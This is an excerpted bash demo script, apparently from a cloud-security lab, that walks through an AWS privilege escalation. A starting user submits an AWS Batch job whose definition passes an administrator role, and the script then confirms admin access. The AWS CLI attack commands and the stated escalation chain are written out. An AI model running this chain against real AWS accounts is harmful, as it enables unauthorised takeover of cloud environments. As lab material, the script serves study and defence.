...
echo "Current identity (readonly): $CURRENT_USER"

use_starting_creds
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity (starting): $CURRENT_USER"
...
# [OBSERVATION] Retrieve account ID using readonly credentials
...
# [OBSERVATION] Confirm starting user lacks admin permissions
...
use_starting_creds
show_attack_cmd "aws batch submit-job --region $AWS_REGION --job-name pl-batch-001-privesc-job --job-queue $JOB_QUEUE_NAME --job-definition ${JOB_DEF_NAME}:${JOB_DEF_REVISION}"
...
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "aws batch describe-jobs --region $AWS_REGION --jobs $JOB_ID --query 'jobs[0].status' --output text"
...
# [OBSERVATION] Confirm admin access by listing IAM users with readonly credentials
echo -e "${YELLOW}Step 9: [OBSERVATION] Verifying administrator access${NC}"
...
echo "  $STARTING_USER -> (RegisterJobDefinition + PassRole) -> Batch Job with $ADMIN_ROLE_NAME"
echo "  -> (SubmitJob) -> Container attaches AdministratorAccess -> Admin"
